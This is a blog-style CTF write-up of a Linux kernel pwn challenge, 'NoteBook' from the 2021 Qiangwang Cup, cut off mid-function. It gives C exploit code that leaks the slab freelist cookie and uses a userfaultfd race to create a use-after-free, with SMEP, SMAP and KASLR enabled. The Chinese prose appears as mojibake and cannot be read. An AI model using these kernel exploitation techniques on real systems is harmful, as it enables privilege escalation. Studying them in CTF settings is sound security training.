<!DOCTYPE html>
<html lang="en-us">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="theme-color" content="dark">
    <title> 2021å¹´ç¬¬äº”å±Šå¼ºç½‘æ¯-NoteBook | FMYY&#39;S Note</title>
    
    
    
    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
</head>

    <body class="dark">
        <nav class="navbar">
    <div class="container">
        <div class="flex">
            <div>
                <a class="brand" href="/">
                    
                    <span class="emoji">
                        ğŸ˜
                    </span>
                    
                    FMYY&#39;S Note
                    </a>
            </div>
            <div class="flex">
                
                <a href="/articles/">Articles</a>
                
                <button id="dark-mode-button"></button>
            </div>
            </div>
    </div>
</nav>
        <main>
            

<div class="container">
    <article>
        <header class="article-header">
            <div class="thumb">
                <div>
                    <h1>2021å¹´ç¬¬äº”å±Šå¼ºç½‘æ¯-NoteBook</h1>
                    <div class="post-meta">
                        <div>
                            By  on <time>June 14, 2021</time>
                        </div>
                        <div class="tags">
                            
                            <a href="/tags/kernel/">Kernel</a>
                            
                            <a href="/tags/pwn/">Pwn</a>
                            
                            <a href="/tags/ctf/">CTF</a>
                            
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </article>

    <div class="article-post">
    <p>å¿™æ´»ä¸‰ä¸ªå¤šå°æ—¶æ‰å°†æ¼æ´åˆ©ç”¨çš„é™„ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šçš„é¶æœºä¸­</p>
<h3 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h3>
<h4 id="qemuå¯åŠ¨è„šæœ¬">Qemuå¯åŠ¨è„šæœ¬</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span class="se">\
</span><span class="se"></span>-m 64M <span class="se">\
</span><span class="se"></span>-kernel bzImage <span class="se">\
</span><span class="se"></span>-initrd rootfs.cpio <span class="se">\
</span><span class="se"></span>-append <span class="s2">&#34;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&#34;</span> <span class="se">\
</span><span class="se"></span>-nographic <span class="se">\
</span><span class="se"></span>-net user <span class="se">\
</span><span class="se"></span>-net nic <span class="se">\
</span><span class="se"></span>-device e1000 <span class="se">\
</span><span class="se"></span>-smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">2</span> <span class="se">\
</span><span class="se"></span>-cpu kvm64,+smep,+smap <span class="se">\
</span><span class="se"></span>-monitor /dev/null 2&gt;/dev/null <span class="se">\
</span><span class="se"></span>-s
</code></pre></td></tr></table>
</div>
</div><p>å¼€å¯ä»¥ä¸‹ä¿æŠ¤</p>
<pre><code>SMEP:  ç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤,ä¿æŠ¤å†…æ ¸æ˜¯å…¶ä¸å…è®¸æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç 
SMAP:  ç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤,ç¦æ­¢å†…æ ¸è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®
KASLR: å†…æ ¸åœ°å€éšæœºåŒ–
       åŒæ—¶,é•œåƒä»¥å¤šçº¿ç¨‹å½¢å¼å¯åŠ¨
</code></pre>
<h4 id="æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–">æ–‡ä»¶ç³»ç»Ÿåˆå§‹åŒ–</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/sh
</span><span class="cp"></span>/bin/mount -t devtmpfs devtmpfs /dev
chown root:tty /dev/console
chown root:tty /dev/ptmx
chown root:tty /dev/tty
mkdir -p /dev/pts
mount -vt devpts -o <span class="nv">gid</span><span class="o">=</span>4,mode<span class="o">=</span><span class="m">620</span> none /dev/pts

mount -t proc proc /proc
mount -t sysfs sysfs /sys

<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/kptr_restrict
<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/kernel/dmesg_restrict

ifup eth0 &gt; /dev/null 2&gt;/dev/null

insmod notebook.ko
cat /proc/modules <span class="p">|</span> grep notebook &gt; /tmp/moduleaddr
chmod <span class="m">777</span> /tmp/moduleaddr
chmod <span class="m">777</span> /dev/notebook
poweroff -d <span class="m">300</span> -f <span class="p">&amp;</span>
<span class="nb">echo</span> <span class="s2">&#34;Welcome to QWB!&#34;</span>

<span class="c1">#sh</span>
setsid cttyhack setuidgid <span class="m">1000</span> sh

umount /proc
umount /sys

poweroff -d <span class="m">1</span> -n -f
</code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬ä¸­ç¦æ­¢<code>ptmx</code>å’Œ<code>tty</code>çš„è®¿é—®,ä½†æ˜¯æŒ‰ç…§Kirinå¸ˆå‚…æ‰€è¿°,å¯ä»¥é€šè¿‡UAFæ¥åŠ«æŒtty_structè¿›è¡Œåˆ©ç”¨,æœ‰ç©ºå»é—®ä¸‹Kirinå¸ˆå‚…<br>
åŒæ—¶ç¨‹åºå°†æ¨¡å—çš„åŠ è½½åœ°å€è·å–åæ”¾ç½®åœ¨<code>/tmp/moduleaddr</code>æ–‡ä»¶ä¸­</p>
<h4 id="äº¤äº’å‡½æ•°">äº¤äº’å‡½æ•°</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">args</span> <span class="p">{</span>
	<span class="n">size_t</span> <span class="n">index</span><span class="p">;</span>
	<span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">note_add</span><span class="p">(</span><span class="n">size_t</span> <span class="n">index</span><span class="p">,</span><span class="n">size_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">args</span> <span class="n">ar</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">note_del</span><span class="p">(</span><span class="n">size_t</span> <span class="n">index</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">args</span> <span class="n">ar</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">note_edit</span><span class="p">(</span><span class="n">size_t</span> <span class="n">index</span><span class="p">,</span><span class="n">size_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">args</span> <span class="n">ar</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">index</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x300</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">gift</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">args</span> <span class="n">ar</span><span class="p">;</span>
	<span class="n">ar</span><span class="p">.</span><span class="n">buf</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_to_kernel</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">index</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">user_ptr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">user_ptr</span><span class="p">,</span><span class="n">index</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">read_from_kernel</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">index</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">user_ptr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">user_ptr</span><span class="p">,</span><span class="n">index</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>é©±åŠ¨å®ç°äº†å‡ ä¸ªç®€å•çš„åŠŸèƒ½,giftå‡½æ•°å¯ä»¥æ‹¿åˆ°<code>note_add</code>ä¸­ç”³è¯·çš„æ‰€æœ‰å †å—åœ°å€</p>
<h4 id="è·å–é©±åŠ¨åœ°å€ä»-tmpmoduleaddr">è·å–é©±åŠ¨åœ°å€ä» /tmp/moduleaddr</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span> <span class="o">=</span><span class="n">popen</span><span class="p">(</span><span class="s">&#34;cat /tmp/moduleaddr  | awk &#39;{print $6}&#39;&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
	<span class="n">fread</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">stream</span><span class="p">);</span>
	<span class="n">mod_address</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">mem</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Mod_BASE:</span><span class="se">\t</span><span class="s"> %lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">mod_address</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="è·å–cookieå€¼">è·å–cookieå€¼</h4>
<p>åœ¨æœ€æ–°æ›´æ–°çš„å†…æ ¸ä¸­,slabä¼šå­˜åœ¨ä¸€ä¸ªå¼‚æˆ–çš„æœºåˆ¶,å³å½“å‰çš„ç›¸åŒå¤§å°çš„<code>slab</code>å—é‡Šæ”¾å,åœ¨fdä½ç½®å­˜æ”¾çš„æ•°æ®æ˜¯ <code>this_chunk_address ^ next_chunk_address ^ cookie</code><br>
å³å­˜æ”¾çš„æ•°æ®æ˜¯å½“å‰å †å—çš„åœ°å€å¼‚æˆ–å‰ä¸€ä¸ªå †å—çš„åœ°å€,å†å¼‚æˆ–ä¸€ä¸ªcookie,ä¸åŒå¤§å°çš„slabæ‰€ä½¿ç”¨çš„cookieå€¼æ˜¯ä¸åŒçš„<br>
æ‰€ä»¥æ­¤å¤„æˆ‘ä»¬éœ€è¦æ³„æ¼ä¸€ä¸‹cookie,é¦–å…ˆåˆ™æ˜¯é€šè¿‡<code>note_gift</code>è·å–ä¸¤ä¸ªå †å—åœ°å€,ç„¶åå†é‡Šæ”¾ä¸¤ä¸ªç›¸åŒå¤§å°çš„slabå†…å­˜å—,å¹¶ç”³è¯·å›æ¥,é€šè¿‡ç®€å•çš„è®¡ç®—å³å¯æ‹¿åˆ°cookieå€¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">note_add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
	<span class="n">note_add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
	<span class="n">gift</span><span class="p">(</span><span class="n">mem</span><span class="p">);</span>
	<span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">;</span>
	<span class="n">heap</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">mem</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;HEAP - 0:</span><span class="se">\t</span><span class="s"> %lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;HEAP - 1:</span><span class="se">\t</span><span class="s"> %lX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">heap</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	
	<span class="n">note_del</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="n">note_del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="n">note_add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
	<span class="n">note_add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x60</span><span class="p">,</span><span class="n">data</span><span class="p">);</span>
	<span class="n">read_from_kernel</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">mem</span><span class="p">);</span>
	<span class="n">cookie</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">mem</span><span class="p">)</span> <span class="o">^</span> <span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">heap</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="æ¼æ´åˆ©ç”¨æ–¹æ³•">æ¼æ´åˆ©ç”¨æ–¹æ³•</h4>
<p><code>Userfaultfd</code>æ˜¯<code>Linux-Kernel</code>ä¸­çš„ä¸€ç§èƒ½å¤Ÿè®©ç”¨æˆ·æ€æ¥å¤„ç†<code>pagefault</code>çš„æœºåˆ¶<br>
ç”±äºåœ¨è§¦å‘<code>pagefault</code>èƒ½å¤Ÿå°†æ§åˆ¶æµå¯¼å›ç”¨æˆ·æ€,å¯ä»¥éå¸¸æœ‰æ•ˆåœ°æ§åˆ¶å†…æ ¸çº¿ç¨‹çš„æ‰§è¡Œé¡ºåº,ä»è€Œå°†ç«æ€æ¡ä»¶ç±»çš„æ¼æ´åˆ©ç”¨è½¬åŒ–ä¸ºç¡®å®šæ€§çš„æ¼æ´åˆ©ç”¨.<br>
åŒæ—¶,é…åˆå†…æ ¸ä¸­æŸäº›ä»»æ„å¤§å°åˆ†é…çš„å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å®ŒæˆUAFå¯¹è±¡çš„åŠ«æŒæ“ä½œï¼Œæé«˜UAFæ¼æ´çš„å¯åˆ©ç”¨æ€§.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">fault_page</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">fault_page_len</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="n">register_userfault</span><span class="p">();</span> 	<span class="c1">// æ³¨å†Œç›‘è§†ç¼ºé¡µå†…å­˜
</span><span class="c1"></span>	<span class="n">write_to_kernel</span><span class="p">(</span><span class="mi">0</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">fault_page</span><span class="p">);</span> 	<span class="c1">// è§¦å‘ç¼ºé¡µå¹¶æŒ‚èµ·è¿›ç¨‹
</span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆmmapåˆ†é…ä¸€ä¸ªå†…å­˜é¡µä½œä¸º,ä½†æ˜¯ä¸å»å¯¹å…¶åœ°å€å¤„èµ‹å€¼è¯»å†™æ“ä½œ,è‹¥å°†æ­¤åœ°å€ä¼ å…¥å†…æ ¸ä¸­,åœ¨å†…æ ¸ä¸­å¯¹å…¶è¿›è¡Œè®¿é—®,åˆ™ä¼šè§¦å‘pagefault,æ‰€ä»¥éœ€è¦é€šè¿‡userfaultfdçš„æ–¹æ³•æ¥å¤„ç†pagefault</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span><span class="o">*</span> <span class="nf">UAF_handler</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">uffd_msg</span> <span class="n">msg</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">uffd</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">arg</span><span class="p">;</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Handler Created&#34;</span><span class="p">);</span>

	<span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pollfd</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">nready</span><span class="p">;</span>
	<span class="n">pollfd</span><span class="p">.</span><span class="n">fd</span>      <span class="o">=</span> <span class="n">uffd</span><span class="p">;</span>
	<span class="n">pollfd</span><span class="p">.</span><span class="n">events</span>  <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
	<span class="n">nready</span> <span class="o">=</span> <span class="n">poll</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pollfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nready</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>  <span class="c1">// Wainting copy_from_user/copy_to_userè®¿é—®FAULT_PAGE
</span><span class="c1"></span>		<span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] Wrong pool return value&#34;</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Trigger! I&#39;m going to hang&#34;</span><span class="p">);</span>
	<span class="n">note_del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
		<span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] Error in reading uffd_msg&#34;</span><span class="p">);</span>
	<span class="n">assert</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">event</span> <span class="o">==</span> <span class="n">UFFD_EVENT_PAGEFAULT</span><span class="p">);</span>
	
	<span class="k">struct</span> <span class="n">uffdio_copy</span> <span class="n">uc</span><span class="p">;</span>
	
	<span class="n">size_t</span> <span class="n">target</span> <span class="o">=</span> <span class="n">cookie</span> <span class="o">^</span>  <span class="p">(</span><span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x2500</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">^</span> <span class="n">heap</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="n">uint64_t</span> <span class="n">DATA</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">target</span><span class="p">,</span><span class="mi">0</span><span class="p">};</span>

	<span class="n">uc</span><span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">DATA</span><span class="p">;</span>
	<span class="n">uc</span><span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fault_page</span><span class="p">;</span>
	<span class="n">uc</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">fault_page_len</span><span class="p">;</span>
	<span class="n">uc</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>  <span class="c1">// æ¢å¤copy_from_user
</span><span class="c1"></span>
	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+] Done&#34;</span><span class="p">);</span>
	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">register_userfault</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">uffdio_api</span> <span class="n">ua</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">uffdio_register</span> <span class="n">ur</span><span class="p">;</span>
	<span class="n">pthread_t</span> <span class="n">thr</span><span class="p">;</span>

	<span class="n">uint64_t</span> <span class="n">uffd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_userfaultfd</span><span class="p">,</span> <span class="n">O_CLOEXEC</span> <span class="o">|</span> <span class="n">O_NONBLOCK</span><span class="p">);</span> <span class="c1">// Create THE User Fault Fd
</span><span class="c1"></span>	<span class="n">ua</span><span class="p">.</span><span class="n">api</span> <span class="o">=</span> <span class="n">UFFD_API</span><span class="p">;</span>
	<span class="n">ua</span><span class="p">.</span><span class="n">features</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_API</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ua</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">errExit</span><span class="p">(</span><span class="s">&#34;[-] ioctl-UFFDIO_API&#34;</span><span class="p">);</span>
	<span class="n">ur</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">start</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fault_page</span><span class="p">;</span>
	<span class="n">ur</span><span class="p">.</span><span class="n">range</span><span class="p">.</span><span class="n">len</span>   <span class="o">=</span> <span class="n">fault_page_len</span><span class="p">;</span>
	<span class="n">ur</span><span class="p">.</span><span class="n">mode</span>        <span class="o">=</span> <span class="n">UFFDIO_REGISTER_MODE_MISSING</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">uffd</span><span class="p">,</span> <span class="n">UFFDIO_REGISTER</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ur</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
